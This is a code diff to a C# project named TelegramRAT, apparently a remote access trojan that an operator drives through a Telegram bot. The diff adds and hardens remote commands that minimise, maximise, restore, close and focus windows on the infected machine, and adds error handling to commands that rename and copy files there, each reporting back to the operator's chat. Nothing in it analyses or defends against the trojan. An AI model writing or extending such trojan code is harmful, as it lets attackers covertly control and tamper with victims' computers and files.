@@ -745,23 +745,25 @@ namespace TelegramRAT
                 IgnoreCountArgs = true,
                 Description = "Minimize window by name, or top window if name was not provided.",
                 Example = "/minimize Calculator",
-                Execute = async (model, update) =>
+                Execute = (model, update) =>
                 {
-                    await Task.Run(async () =>
+                    Task.Run(() =>
                     {
                         try
                         {
                             if (model.Args.Length > 0)
                             {
-                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
-                                //WinAPI.MinimizeWindow(WinAPI.FindWindow(null, model.RawArgs));
+                                if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                                    WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
+                                else
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
                             }
                             else
                             {
                                 WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                             }
 
-                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
 
                         }
                         catch (Exception ex)
@@ -782,8 +784,11 @@ namespace TelegramRAT
                     {
                         if (model.Args.Length > 0)
                         {
-                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
-                            //WinAPI.MinimizeWindow(WinAPI.FindWindow(null, model.RawArgs));
+                            if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
+                            else
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
+
                         }
                         else
                         {
@@ -805,8 +810,11 @@ namespace TelegramRAT
                     {
                         if (model.Args.Length > 0)
                         {
-                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
-                            //WinAPI.MinimizeWindow(WinAPI.FindWindow(null, model.RawArgs));
+                            if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
+                            else
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
+
                         }
                         else
                         {
@@ -815,6 +823,59 @@ namespace TelegramRAT
 
                         Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
 
+                    });
+                }
+            });
+
+            //CLOSE WINDOW
+            commands.Add(new BotCommand
+            {
+                Command = "/close",
+                Description = "Close window by its title, or top window if title was not provided",
+                Example = "/close Calculator",
+                Execute = async (model, update) =>
+                {
+                    await Task.Run(() =>
+                    {
+                        if (model.Args.Length > 0)
+                        {
+                            if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
+                            else
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
+                        }
+                        else
+                        {
+                            WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
+                        }
+
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+
+                    });
+                }
+            });
+
+            //SET FOCUS
+            commands.Add(new BotCommand
+            {
+                Command = "/setfocus",
+                MayHaveNoArgs = false,
+                Description = "Set focus to window by its title.",
+                Example = "/setfocus Calculator",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                        {
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                        }
+                        else
+                        {
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
+                        }
                     });
                 }
             });
@@ -1258,19 +1319,26 @@ namespace TelegramRAT
                 {
                     Task.Run(() =>
                     {
-                        if (System.IO.File.Exists(model.Args[0]) && !System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
+                        try
                         {
-                            string fileToRename = Path.GetFullPath(model.Args[0]);
-                            string newFileName = $"{Path.GetDirectoryName(fileToRename)}\\{model.Args[1]}";
-                            System.IO.File.Move(fileToRename, newFileName);
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                            if (System.IO.File.Exists(model.Args[0]) && !System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
+                            {
+                                string fileToRename = Path.GetFullPath(model.Args[0]);
+                                string newFileName = $"{Path.GetDirectoryName(fileToRename)}\\{model.Args[1]}";
+                                System.IO.File.Move(fileToRename, newFileName);
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                            }
+                            else
+                            {
+                                if (!System.IO.File.Exists(model.Args[0]))
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
+                                if (System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is a file with the same name!", replyToMessageId: update.Message.MessageId);
+                            }
                         }
-                        else
+                        catch(Exception ex)
                         {
-                            if (!System.IO.File.Exists(model.Args[0]))
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
-                            if (System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is a file with the same name!", replyToMessageId: update.Message.MessageId);
+                            ReportError(update, ex);
                         }
                     });
                 }
@@ -1287,16 +1355,23 @@ namespace TelegramRAT
                 {
                     Task.Run(() =>
                     {
-                        if (System.IO.File.Exists(model.Args[0]) && Directory.Exists(model.Args[1]))
+                        try
                         {
-                            System.IO.File.Copy(model.Args[0], $"{model.Args[1]}\\{Path.GetFileName(model.Args[1])}");
+                            if (System.IO.File.Exists(model.Args[0]) && Directory.Exists(model.Args[1]))
+                            {
+                                System.IO.File.Copy(model.Args[0], $"{model.Args[1]}\\{Path.GetFileName(model.Args[1])}");
+                            }
+                            else
+                            {
+                                if (!System.IO.File.Exists(model.Args[0]))
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
+                                if (!Directory.Exists(model.Args[1]))
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This path does not exist!", replyToMessageId: update.Message.MessageId);
+                            }
                         }
-                        else
+                        catch(Exception ex)
                         {
-                            if (!System.IO.File.Exists(model.Args[0]))
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
-                            if (!Directory.Exists(model.Args[1]))
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This path does not exist!", replyToMessageId: update.Message.MessageId);
+                            ReportError(update, ex);
                         }
                     });
                 }
